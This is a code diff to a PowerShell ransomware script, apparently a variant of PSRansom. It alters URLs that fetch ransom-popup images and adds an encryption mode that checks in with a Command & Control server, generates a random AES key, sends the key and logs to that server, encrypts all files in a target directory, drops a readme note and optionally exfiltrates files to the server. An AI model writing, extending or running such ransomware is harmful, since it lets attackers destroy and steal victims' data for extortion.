@@ -1,4 +1,4 @@
-﻿# Design
+# Design
 $ProgressPreference = "SilentlyContinue"
 $ErrorActionPreference = "SilentlyContinue"
 $OSVersion = [Environment]::OSVersion.Platform
@@ -166,8 +166,8 @@ function PopUpRansom {
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
-Invoke-WebRequest -useb https://raw.githubusercontent.com/azgaviperr/misc/main/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
-Invoke-WebRequest -useb https://raw.githubusercontent.com/azgaviperr/misc/main/PSRansom.ico -Outfile $env:temp\RUCyberArmy.ico
+Invoke-WebRequest -useb https://github.com/BZHack/Farewell-Ransom/blob/main/Demo/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
+Invoke-WebRequest -useb https://github.com/BZHack/Farewell-Ransom/blob/main/Demo/PSRansom.ico -Outfile $env:temp\RUCyberArmy.ico
 $shell = New-Object -ComObject "Shell.Application"
 $shell.minimizeall()
 
@@ -415,6 +415,29 @@ if ($Mode -eq "-d") {
          ExfiltrateFiles ; Start-Sleep 1 }}
    
       }
+   elseif ($Mode -eq "-e"){
+      Write-Host ; Write-Host "[!] Starting ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
+      Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
+      $C2Status = GetStatus ; Start-Sleep 1
+   
+      Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
+      $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
+      SendResults
+   
+      if (!$C2Status) { Write-Host "[+] Saving logs in 000_readme.txt.. and key in 000_key.txt" -ForegroundColor Blue
+          Add-Content -Path "$Directory$slash$KeyFile" -Value "Recovery Key: $PSRKey"
+         (Get-Item $Directory$slash$KeyFile).Attributes += [io.fileattributes]::Hidden }
+      else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }
+   
+   
+      Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
+      CreateReadme ; EncryptFiles ; if ($C2Status) { SendResults ; Start-Sleep 1
+   
+      if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
+         ExfiltrateFiles ; Start-Sleep 1 }}
+   
+      }
+
 else {
    Show-Help
    }
